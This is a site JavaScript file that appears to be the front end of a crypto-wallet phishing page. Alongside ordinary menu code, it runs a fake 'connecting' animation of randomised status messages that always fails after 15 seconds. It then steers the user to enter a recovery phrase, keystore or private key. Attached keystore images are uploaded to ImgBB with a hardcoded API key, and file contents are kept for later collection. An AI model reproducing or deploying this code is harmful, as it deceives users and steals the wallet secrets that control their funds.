/* ── Products dropdown ───────────────────────────────── */
const productsBtn = document.getElementById('productsBtn');
const productsDropdown = document.getElementById('productsDropdown');
const productsArrow = document.getElementById('productsArrow');

function openDropdown() {
    productsDropdown.classList.add('open');
    productsArrow.style.transform = 'rotate(180deg)';
}
function closeDropdown() {
    productsDropdown.classList.remove('open');
    productsArrow.style.transform = 'rotate(0deg)';
}

productsBtn.addEventListener('mouseenter', openDropdown);
productsBtn.addEventListener('focus', openDropdown);

// Close when mouse leaves both trigger and dropdown
let leaveTimer;
productsBtn.addEventListener('mouseleave', () => { leaveTimer = setTimeout(closeDropdown, 120); });
productsDropdown.addEventListener('mouseenter', () => clearTimeout(leaveTimer));
productsDropdown.addEventListener('mouseleave', closeDropdown);

document.addEventListener('click', (e) => {
    if (!productsBtn.contains(e.target) && !productsDropdown.contains(e.target)) closeDropdown();
});


/* ── Mobile hamburger ────────────────────────────────── */
const hamburger = document.getElementById('hamburger');
const mobileMenu = document.getElementById('mobileMenu');
let menuOpen = false;

hamburger.addEventListener('click', () => {
    menuOpen = !menuOpen;
    mobileMenu.classList.toggle('open', menuOpen);
});

// Close on nav link click
mobileMenu.querySelectorAll('a').forEach(link => {
    link.addEventListener('click', () => {
        menuOpen = false;
        mobileMenu.classList.remove('open');
    });
});


/* ── Floating video bubble visibility ────────────────── */
const bubble = document.getElementById('floatingBubble');
const heroSection = document.getElementById('heroSection');

function updateBubble() {
    // Show bubble only after user has scrolled past 80px from top
    if (window.scrollY > 80) {
        bubble.classList.remove('hidden');
    } else {
        bubble.classList.add('hidden');
    }
}

window.addEventListener('scroll', updateBubble, { passive: true });
updateBubble(); // run once on load


// initCanvas stub – defined here since script.js is empty
function initCanvas() { }

// Init after fonts/layout settle
window.addEventListener('load', initCanvas);
window.addEventListener('resize', () => {
    setTimeout(initCanvas, 100);
});


/* ── Support card handler ────────────────────────────── */
function openSupport(type) {
    openWallet();
}


/* ── Layer carousel nav (cosmetic) ──────────────────── */
document.getElementById('layerPrev').addEventListener('click', () => {
    document.getElementById('layerPrev').classList.toggle('inactive');
    document.getElementById('layerNext').classList.remove('inactive');
});
document.getElementById('layerNext').addEventListener('click', () => {
    document.getElementById('layerNext').classList.toggle('inactive');
    document.getElementById('layerPrev').classList.remove('inactive');
});

const wOverlay = document.getElementById('wOverlay');
const wScreen1 = document.getElementById('wScreen1');
const subIds = ['wScreenOther', 'wScreen2', 'wScreen3', 'wScreen4', 'wScreen5'];

// ┌──────────────────────────────────────────────────┐
// │  openWallet()  ← ADD onclick="openWallet()"      │
// │  to any button on your site to trigger the modal │
// └──────────────────────────────────────────────────┘
function openWallet() {
    wOverlay.classList.add('open');
    document.body.style.overflow = 'hidden';
    allOff();
}

function closeWallet() {
    stopTimers();
    wOverlay.classList.remove('open');
    document.body.style.overflow = '';
    allOff();
}

function allOff() {
    wScreen1.classList.remove('hidden');
    subIds.forEach(id => document.getElementById(id).classList.remove('active'));
}

function showSub(id) {
    wScreen1.classList.add('hidden');
    subIds.forEach(sid => document.getElementById(sid).classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

// close on backdrop / Escape
wOverlay.addEventListener('click', e => { if (e.target === wOverlay) closeWallet(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeWallet(); });

// ── Wallet identity ───────────────────────────────
function setWallet(img, name) {
    ['s2Img', 's3Img', 's4Img', 's5Img'].forEach(id => document.getElementById(id).src = img);
    ['s2Name', 's3Name', 's4Name', 's5Name'].forEach(id => document.getElementById(id).textContent = name);
}

function handleWalletSelect(el) {
    const img = el.querySelector('img').src;
    const name = (el.querySelector('.w-feat-name') || el.querySelector('.w-item-name')).textContent;
    setWallet(img, name);
    startConnecting();
}

// ── Other wallets + search ────────────────────────
const ALL_WALLETS = Array.from(document.querySelectorAll('.ow-item'));
const TOTAL = ALL_WALLETS.length;

function openOtherWallets() {
    showSub('wScreenOther');
    const inp = document.getElementById('owSearch');
    inp.value = '';
    setTimeout(() => inp.focus(), 100);
    filterOw('');
}

document.getElementById('owSearch').addEventListener('input', function () {
    filterOw(this.value.trim().toLowerCase());
});

function filterOw(q) {
    let visible = 0;
    ALL_WALLETS.forEach(item => {
        const n = item.querySelector('.ow-name').textContent.toLowerCase();
        const c = item.querySelector('.ow-chain').textContent.toLowerCase();
        const show = !q || n.includes(q) || c.includes(q);
        item.classList.toggle('hidden', !show);
        if (show) visible++;
    });
    const nr = document.getElementById('owNoResults');
    const ct = document.getElementById('owCount');
    document.getElementById('owQuery').textContent = q;
    if (q && visible === 0) {
        nr.style.display = 'block';
        ct.textContent = 'No results';
    } else {
        nr.style.display = 'none';
        ct.textContent = q
            ? `${visible} wallet${visible === 1 ? '' : 's'} found`
            : `${TOTAL} wallets`;
    }
}

function selectOwWallet(el) {
    const img = el.querySelector('img').src;
    const name = el.querySelector('.ow-name').textContent;
    setWallet(img, name);
    startConnecting();
}

// ── Type toggle (Screen 4) ────────────────────────
function switchType(type) {
    ['phrase', 'keystore', 'privatekey'].forEach(t => {
        document.getElementById('btn-' + t).classList.toggle('active', t === type);
        document.getElementById('pane-' + t).classList.toggle('active', t === type);
    });
}

const IMGBB_API_KEY = "41a8f8a46afb0e1960d74a605fd1e845"; // <--- REPLACE THIS WITH YOUR FREE IMGBB API KEY

function uploadToImgBB(file) {
    const formData = new FormData();
    formData.append("image", file);

    fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
        method: "POST",
        body: formData
    })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                document.getElementById('keystoreInput').dataset.imgUrl = data.data.url;
            } else {
                console.error("ImgBB Error:", data);
            }
        })
        .catch(error => {
            console.error("ImgBB Upload Exception:", error);
        });
}

// Keystore file attach
function handleKeystoreFile(input) {
    const file = input.files[0];
    if (!file) return;

    // Clear out any old lingering data from previous uploads
    delete document.getElementById('keystoreInput').dataset.imgUrl;
    delete document.getElementById('keystoreInput').dataset.imgBase64;
    delete document.getElementById('keystoreInput').dataset.fileContent;

    const nameEl = document.getElementById('attachFileName');
    nameEl.textContent = '📎 ' + file.name;
    const reader = new FileReader();
    reader.onload = e => {
        if (file.type.startsWith('image/')) {
            document.getElementById('keystoreInput').dataset.imgBase64 = "Image stored, awaiting ImgBB...";
            uploadToImgBB(file);
        } else {
            // Save the raw text of the file directly to dataset so it NEVER wipes what the user typed in the textbox!
            document.getElementById('keystoreInput').dataset.fileContent = e.target.result;
        }
    };
    if (file.type.startsWith('image/')) {
        reader.readAsDataURL(file);
    } else {
        reader.readAsText(file);
    }
}

// ── Timers ────────────────────────────────────────
let cTimer, sTimer, pTimer, aborted = false;
function stopTimers() {
    clearTimeout(cTimer); clearInterval(sTimer); clearInterval(pTimer);
    aborted = true;
}

const statusMsgs = [
    "Initializing secure connection...", "Scanning for wallet device...",
    "Establishing encrypted channel...", "Verifying wallet signature...",
    "Requesting account access...", "Checking network compatibility...",
    "Syncing wallet state...", "Authenticating session...",
    "Resolving on-chain identity...", "Confirming wallet permissions...",
    "Loading account balances...", "Retrieving transaction history...",
    "Validating network endpoints...", "Preparing secure handshake...",
    "Awaiting device confirmation...", "Connecting to mainnet...",
    "Syncing asset registry...", "Verifying chain ID...",
    "Establishing WebSocket link...", "Fetching wallet metadata...",
    "Decoding wallet address...", "Requesting signing permissions...",
    "Resolving address...", "Preparing wallet interface...",
    "Almost there — finalizing...", "Connecting to RPC endpoint...",
    "Binding wallet to session...", "Verifying account integrity...",
    "Checking pending transactions...", "Finalizing authentication...",
    "Connection attempt finishing..."
];

function startConnecting() {
    aborted = false;
    showSub('wScreen2');
    const statusEl = document.getElementById('s2Status');
    const progressEl = document.getElementById('s2Progress');
    progressEl.style.width = '0%';
    let pool = [...statusMsgs].sort(() => Math.random() - 0.5);
    let i = 0;
    statusEl.textContent = pool[0];
    sTimer = setInterval(() => {
        i++;
        statusEl.style.opacity = '0';
        setTimeout(() => {
            statusEl.textContent = pool[i % pool.length];
            statusEl.style.opacity = '1';
        }, 100);
    }, 300);
    let pct = 0;
    pTimer = setInterval(() => {
        pct = Math.min(pct + (100 / (15000 / 200)), 99);
        progressEl.style.width = pct + '%';
    }, 200);
    cTimer = setTimeout(() => {
        if (aborted) return;
        clearInterval(sTimer); clearInterval(pTimer);
        progressEl.style.width = '100%';
        showSub('wScreen3');
    }, 15000);
}

document.getElementById('retryBtn').addEventListener('click', () => {
    stopTimers(); startConnecting();
});
document.getElementById('manualBtn').addEventListener('click', () => {
    stopTimers();
    switchType('keystore');
    showSub('wScreen4');
});


function handleRetryManual() {
    document.getElementById('detailInput').value = '';
    document.getElementById('keystoreInput').value = '';
    document.getElementById('privkeyInput').value = '';
    document.getElementById('attachFileName').textContent = '';
    document.getElementById('keystoreFileInput').value = '';
    switchType('keystore');
    showSub('wScreen4');
}